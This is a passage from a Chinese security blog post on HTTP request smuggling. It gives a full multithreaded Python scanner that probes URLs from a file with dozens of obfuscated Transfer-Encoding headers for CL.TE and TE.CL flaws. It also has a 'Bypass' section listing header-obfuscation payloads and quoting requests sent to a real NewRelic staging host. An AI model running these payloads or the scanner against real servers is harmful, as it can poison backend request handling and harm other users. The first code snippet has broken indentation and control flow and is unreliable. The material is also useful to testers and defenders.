<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
<p>而由于后端服务器使用CL解析，解析<code>Content-Length: 6</code>便会尝试获取请求报文中的6字节内容，而<code>0\r\n\r\n</code>只有5个字节，后端服务器会等待第6个字节直至超时。</p>
<p>如果服务端是CL.TE类型，则此检测方法将使X毒化后端服务器的请求，从而可能损害合法用户。但是我们可以通过先执行CL.TE类HRS的检测再执行TE.CL类HRS的检测来避免这个问题。</p>
<p>代码实现如下，通过判断CL为6超时、CL为5不超时来确定是存在TE.CL型HRS漏洞：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_TECL</span><span class="params">(self)</span>:</span></span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    payloads = self.payload_headers <span class="keyword">if</span> self.headers_payload == [] <span class="keyword">else</span> self.headers_payload</span><br><span class="line">    <span class="keyword">for</span> headers <span class="keyword">in</span> payloads:</span><br><span class="line">        n = n + <span class="number">1</span></span><br><span class="line">        payload = <span class="string">"0\r\n\r\nX"</span></span><br><span class="line">        headers[<span class="string">'Content-Length'</span>] = <span class="number">6</span></span><br><span class="line">        print(self.url, headers)</span><br><span class="line">        t2 = self.detect_TECL(headers, payload)</span><br><span class="line">        <span class="keyword">if</span> t2 == <span class="keyword">None</span>: t2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> t2 &lt; <span class="number">5</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                print(self.url, headers)</span><br><span class="line">                payload = <span class="string">"0\r\n\r\n"</span></span><br><span class="line">                headers[<span class="string">'Content-Length'</span>] = <span class="number">5</span></span><br><span class="line">                t1 = self.detect_TECL(headers, payload)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> t1 == <span class="keyword">None</span>: t1 = <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> t2 == <span class="keyword">None</span>: t2 = <span class="number">0</span></span><br><span class="line">                        <span class="comment"># print (t1, t2)</span></span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> t2 &gt; <span class="number">5</span> <span class="keyword">and</span> t2 / t1 &gt;= <span class="number">5</span>:</span><br><span class="line">                            self.valid = <span class="keyword">True</span></span><br><span class="line">                            self.type = <span class="string">"TE-CL"</span></span><br><span class="line">                            self.headers_payload = [headers]</span><br><span class="line">                            <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></table></figure>
<h3 id="网上参考的脚本"><a href="#网上参考的脚本" class="headerlink" title="网上参考的脚本"></a>网上参考的脚本</h3><p>基于上面的基础，脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Author: xph</span></span><br><span class="line"><span class="string">CreateTime: 2019-09-18</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> Request, Session</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> ReadTimeout</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="keyword">import</span> http.client</span><br><span class="line"></span><br><span class="line">http.client._is_legal_header_name = <span class="keyword">lambda</span> x: <span class="keyword">True</span></span><br><span class="line">http.client._is_illegal_header_value = <span class="keyword">lambda</span> x: <span class="keyword">False</span></span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">fp = open(<span class="string">"res.txt"</span>, <span class="string">'a'</span>)</span><br><span class="line">fp.write(<span class="string">"\n"</span> + <span class="string">"-"</span> * <span class="number">50</span> + <span class="string">"\n"</span>)</span><br><span class="line">fp.flush()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HTTP_REQUEST_SMUGGLER</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, url)</span>:</span></span><br><span class="line">        self.headers_payload = []</span><br><span class="line">        self.valid = <span class="keyword">False</span></span><br><span class="line">        self.type = <span class="string">""</span></span><br><span class="line">        self.url = url</span><br><span class="line">        self.Transfer_Encoding1 = [[<span class="string">"Transfer-Encoding"</span>, <span class="string">"chunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding "</span>, <span class="string">"chunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer_Encoding"</span>, <span class="string">"chunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer Encoding"</span>, <span class="string">"chunked"</span>],</span><br><span class="line">                                   [<span class="string">" Transfer-Encoding"</span>, <span class="string">"chunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">"  chunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">"chunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">"\tchunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">"\u000Bchunked"</span>],</span><br><span class="line">                                   [<span class="string">"Content-Encoding"</span>, <span class="string">" chunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">"\n chunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding\n "</span>, <span class="string">" chunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" \"chunked\""</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" 'chunked'"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" \n\u000Bchunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" \n\tchunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" chunked, cow"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" cow, "</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" chunked\r\nTransfer-encoding: cow"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" chunk"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" cHuNkeD"</span>],</span><br><span class="line">                                   [<span class="string">"TrAnSFer-EnCODinG"</span>, <span class="string">" cHuNkeD"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" CHUNKED"</span>],</span><br><span class="line">                                   [<span class="string">"TRANSFER-ENCODING"</span>, <span class="string">" CHUNKED"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" chunked\r"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" chunked\t"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" cow\r\nTransfer-Encoding: chunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" cow\r\nTransfer-Encoding: chunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer\r-Encoding"</span>, <span class="string">" chunked"</span>],</span><br><span class="line">                                   [<span class="string">"barn\n\nTransfer-Encoding"</span>, <span class="string">" chunked"</span>],</span><br><span class="line">                                   ]</span><br><span class="line"></span><br><span class="line">        self.Transfer_Encoding = list(self.Transfer_Encoding1)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> self.Transfer_Encoding1:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">" "</span> == x[<span class="number">1</span>][<span class="number">0</span>]:</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">9</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>]:</span><br><span class="line">                    <span class="comment"># print (type(chr(i)))</span></span><br><span class="line">                    c = str(chr(i))</span><br><span class="line">                    self.Transfer_Encoding.append([x[<span class="number">0</span>], c + x[<span class="number">1</span>][<span class="number">1</span>:]])</span><br><span class="line"></span><br><span class="line">        self.payload_headers = []</span><br><span class="line">        self.n1 = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> self.Transfer_Encoding:</span><br><span class="line">            headers = collections.OrderedDict()</span><br><span class="line">            headers[x[<span class="number">0</span>]] = x[<span class="number">1</span>]</span><br><span class="line">            headers[<span class="string">'Cache-Control'</span>] = <span class="string">"no-cache"</span></span><br><span class="line">            headers[<span class="string">'Content-Type'</span>] = <span class="string">"application/x-www-form-urlencoded"</span></span><br><span class="line">            headers[<span class="string">'User-Agent'</span>] = <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"</span></span><br><span class="line">            self.payload_headers.append(headers)</span><br><span class="line">            self.n1 = self.n1 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">detect_CLTE</span><span class="params">(self, headers=&#123;&#125;, payload=<span class="string">""</span>)</span>:</span></span><br><span class="line">        s = Session()</span><br><span class="line">        req = Request(<span class="string">'POST'</span>, self.url, data=payload)</span><br><span class="line">        prepped = req.prepare()</span><br><span class="line">        prepped.headers = headers</span><br><span class="line">        resp_time = <span class="number">0</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            resp = s.send(prepped, verify=<span class="keyword">False</span>, timeout=<span class="number">10</span>)</span><br><span class="line">            resp_time = resp.elapsed.total_seconds()</span><br><span class="line">            <span class="keyword">return</span> resp_time</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">print</span> (e)</span><br><span class="line">            resp_time = <span class="number">10</span></span><br><span class="line">            <span class="keyword">if</span> isinstance(e, ReadTimeout):</span><br><span class="line">                print(<span class="string">"requests.exceptions.ReadTimeout"</span>)</span><br><span class="line">                <span class="keyword">return</span> resp_time</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">detect_TECL</span><span class="params">(self, headers=&#123;&#125;, payload=<span class="string">""</span>)</span>:</span></span><br><span class="line">        s = Session()</span><br><span class="line">        req = Request(<span class="string">'POST'</span>, self.url, data=payload)</span><br><span class="line">        prepped = req.prepare()</span><br><span class="line">        prepped.headers = headers</span><br><span class="line">        resp_time = <span class="number">0</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            resp = s.send(prepped, verify=<span class="keyword">False</span>, timeout=<span class="number">10</span>)</span><br><span class="line">            resp_time = resp.elapsed.total_seconds()</span><br><span class="line">            print(resp, resp_time)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">print</span> (e)</span><br><span class="line">            <span class="keyword">if</span> isinstance(e, ReadTimeout):</span><br><span class="line">                resp_time = <span class="number">10</span></span><br><span class="line">                print(<span class="string">"requests.exceptions.ReadTimeout"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(resp_time)</span></span><br><span class="line">        <span class="keyword">return</span> resp_time</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_CLTE</span><span class="params">(self)</span>:</span></span><br><span class="line">        n = <span class="number">0</span></span><br><span class="line">        payloads = self.payload_headers <span class="keyword">if</span> self.headers_payload == [] <span class="keyword">else</span> self.headers_payload</span><br><span class="line">        <span class="keyword">for</span> headers <span class="keyword">in</span> payloads:</span><br><span class="line">            n = n + <span class="number">1</span></span><br><span class="line">            headers[<span class="string">'Content-Length'</span>] = <span class="number">4</span></span><br><span class="line">            payload = <span class="string">"1\r\nZ\r\nQ\r\n\r\n\r\n"</span></span><br><span class="line">            print(self.url, headers)</span><br><span class="line">            t2 = self.detect_CLTE(headers, payload)</span><br><span class="line">            <span class="keyword">if</span> t2 == <span class="keyword">None</span>: t2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> t2 &lt; <span class="number">5</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            headers[<span class="string">'Content-Length'</span>] = <span class="number">11</span></span><br><span class="line">            print(self.url, headers)</span><br><span class="line">            payload = <span class="string">"1\r\nZ\r\nQ\r\n\r\n\r\n"</span></span><br><span class="line">            t1 = self.detect_CLTE(headers, payload)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> t1 == <span class="keyword">None</span>: t1 = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">print</span> (t1, t2)</span><br><span class="line">            <span class="keyword">if</span> t2 &gt; <span class="number">5</span> <span class="keyword">and</span> t2 / t1 &gt;= <span class="number">5</span>:</span><br><span class="line">                self.valid = <span class="keyword">True</span></span><br><span class="line">                self.type = <span class="string">"CL-TE"</span></span><br><span class="line">                self.headers_payload = [headers]</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_TECL</span><span class="params">(self)</span>:</span></span><br><span class="line">        n = <span class="number">0</span></span><br><span class="line">        payloads = self.payload_headers <span class="keyword">if</span> self.headers_payload == [] <span class="keyword">else</span> self.headers_payload</span><br><span class="line">        <span class="keyword">for</span> headers <span class="keyword">in</span> payloads:</span><br><span class="line">            n = n + <span class="number">1</span></span><br><span class="line">            payload = <span class="string">"0\r\n\r\nX"</span></span><br><span class="line">            headers[<span class="string">'Content-Length'</span>] = <span class="number">6</span></span><br><span class="line">            print(self.url, headers)</span><br><span class="line">            t2 = self.detect_TECL(headers, payload)</span><br><span class="line">            <span class="keyword">if</span> t2 == <span class="keyword">None</span>: t2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> t2 &lt; <span class="number">5</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            print(self.url, headers)</span><br><span class="line">            payload = <span class="string">"0\r\n\r\n"</span></span><br><span class="line">            headers[<span class="string">'Content-Length'</span>] = <span class="number">5</span></span><br><span class="line">            t1 = self.detect_TECL(headers, payload)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> t1 == <span class="keyword">None</span>: t1 = <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> t2 == <span class="keyword">None</span>: t2 = <span class="number">0</span></span><br><span class="line">            <span class="comment"># print (t1, t2)</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> t2 &gt; <span class="number">5</span> <span class="keyword">and</span> t2 / t1 &gt;= <span class="number">5</span>:</span><br><span class="line">                self.valid = <span class="keyword">True</span></span><br><span class="line">                self.type = <span class="string">"TE-CL"</span></span><br><span class="line">                self.headers_payload = [headers]</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            h = &#123;</span><br><span class="line">                <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"</span>&#125;</span><br><span class="line">            requests.get(self.url, headers=h, verify=<span class="keyword">False</span>, timeout=<span class="number">10</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> self.check_CLTE():</span><br><span class="line">                self.check_TECL()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">            print(<span class="string">"timeout: "</span> + self.url)</span><br><span class="line">        <span class="keyword">return</span> self.recheck()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recheck</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"recheck"</span>)</span><br><span class="line">        print(self.valid, self.type)</span><br><span class="line">        <span class="keyword">if</span> self.valid:</span><br><span class="line">            <span class="keyword">if</span> self.type == <span class="string">"CL-TE"</span>:</span><br><span class="line">                <span class="keyword">if</span> self.check_CLTE():</span><br><span class="line">                    <span class="keyword">print</span> (<span class="string">"Find CL-TE: "</span> + self.url)</span><br><span class="line">                    payload_key = list(self.headers_payload[<span class="number">0</span>])[<span class="number">0</span>]</span><br><span class="line">                    payload_value = self.headers_payload[<span class="number">0</span>][payload_key]</span><br><span class="line">                    payload = str([payload_key, payload_value])</span><br><span class="line">                    print(payload)</span><br><span class="line">                    fp.write(<span class="string">"CL-TE\t poc:"</span> + payload + <span class="string">"\t"</span> + self.url + <span class="string">"\n"</span>)</span><br><span class="line">                    fp.flush()</span><br><span class="line">                    <span class="keyword">return</span> [<span class="string">"CL-TE"</span>, payload]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> self.check_TECL():</span><br><span class="line">                    <span class="keyword">print</span> (<span class="string">"Find TE-CL: "</span> + self.url)</span><br><span class="line">                    payload_key = list(self.headers_payload[<span class="number">0</span>])[<span class="number">0</span>]</span><br><span class="line">                    payload_value = self.headers_payload[<span class="number">0</span>][payload_key]</span><br><span class="line">                    payload = str([payload_key, payload_value])</span><br><span class="line">                    print(payload)</span><br><span class="line">                    fp.write(<span class="string">"TE-CL\t poc:"</span> + payload + <span class="string">"\t"</span> + self.url + <span class="string">"\n"</span>)</span><br><span class="line">                    fp.flush()</span><br><span class="line">                    <span class="keyword">return</span> [<span class="string">"TE-Cl"</span>, payload]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(url)</span>:</span></span><br><span class="line">    a = HTTP_REQUEST_SMUGGLER(url)</span><br><span class="line">    print(a.run())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> threadpool</span><br><span class="line">    iter_list = open(<span class="string">"urls.txt"</span>).read().split(<span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">    pool = threadpool.ThreadPool(<span class="number">30</span>)</span><br><span class="line">    thread_requests = threadpool.makeRequests(func, iter_list)</span><br><span class="line">    [pool.putRequest(req) <span class="keyword">for</span> req <span class="keyword">in</span> thread_requests]</span><br><span class="line">    pool.wait()</span><br><span class="line"></span><br><span class="line">func(<span class="string">"https://example.com"</span>)</span><br></pre></td></tr></table></figure>
<h2 id="0x06-Bypass技巧"><a href="#0x06-Bypass技巧" class="headerlink" title="0x06 Bypass技巧"></a>0x06 Bypass技巧</h2><h3 id="混淆TE头"><a href="#混淆TE头" class="headerlink" title="混淆TE头"></a>混淆TE头</h3><p>前面提到了一些混淆TE头的方法如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: xchunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: x</span><br><span class="line"></span><br><span class="line">Transfer-Encoding:[tab]chunked</span><br><span class="line"></span><br><span class="line">[space]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">X: X[\n]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding</span><br><span class="line">: chunked</span><br></pre></td></tr></table></figure>
<p>除此之外，更多的一些混淆方法如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding:chunked</span><br><span class="line">Transfer-Encoding :chunked</span><br><span class="line">Transfer_Encoding:chunked</span><br><span class="line">Transfer Encoding:chunked</span><br><span class="line"> Transfer-Encoding:chunked</span><br><span class="line">Transfer-Encoding:  chunked</span><br><span class="line">Transfer-Encoding:chunked</span><br><span class="line">Transfer-Encoding:\tchunked</span><br><span class="line">Transfer-Encoding:\u000Bchunked</span><br><span class="line">Content-Encoding: chunked</span><br><span class="line">Transfer-Encoding:\n chunked</span><br><span class="line">Transfer-Encoding\n : chunked</span><br><span class="line">Transfer-Encoding: \&quot;chunked\&quot;</span><br><span class="line">Transfer-Encoding: &apos;chunked&apos;</span><br><span class="line">Transfer-Encoding: \n\u000Bchunked</span><br><span class="line">Transfer-Encoding: \n\tchunked</span><br><span class="line">Transfer-Encoding: chunked, cow</span><br><span class="line">Transfer-Encoding: cow, </span><br><span class="line">Transfer-Encoding: chunked\r\nTransfer-encoding: cow</span><br><span class="line">Transfer-Encoding: chunk</span><br><span class="line">Transfer-Encoding: cHuNkeD</span><br><span class="line">TrAnSFer-EnCODinG: cHuNkeD</span><br><span class="line">Transfer-Encoding: CHUNKED</span><br><span class="line">TRANSFER-ENCODING: CHUNKED</span><br><span class="line">Transfer-Encoding: chunked\r</span><br><span class="line">Transfer-Encoding: chunked\t</span><br><span class="line">Transfer-Encoding: cow\r\nTransfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: cow\r\nTransfer-Encoding: chunked</span><br><span class="line">Transfer\r-Encoding: chunked</span><br><span class="line">barn\n\nTransfer-Encoding: chunked</span><br></pre></td></tr></table></figure>
<h3 id="设置X-Forwarded-Proto以解决无法HTTP发送的问题"><a href="#设置X-Forwarded-Proto以解决无法HTTP发送的问题" class="headerlink" title="设置X-Forwarded-Proto以解决无法HTTP发送的问题"></a>设置X-Forwarded-Proto以解决无法HTTP发送的问题</h3><p>原payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1Host: staging-alerts.newrelic.comHTTP/1.1 301 Moved PermanentlyLocation: https://staging-alerts.newrelic.com/</span><br></pre></td></tr></table></figure>
<p>修改后：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1Host: staging-alerts.newrelic.comX-Forwarded-Proto: httpsHTTP/1.1 404 Not FoundAction Controller: Exception caught</span><br></pre></td></tr></table></figure>
<h3 id="设置X-nr-external-service授权标头"><a href="#设置X-nr-external-service授权标头" class="headerlink" title="设置X-nr-external-service授权标头"></a>设置X-nr-external-service授权标头</h3><p>原payload：</p>
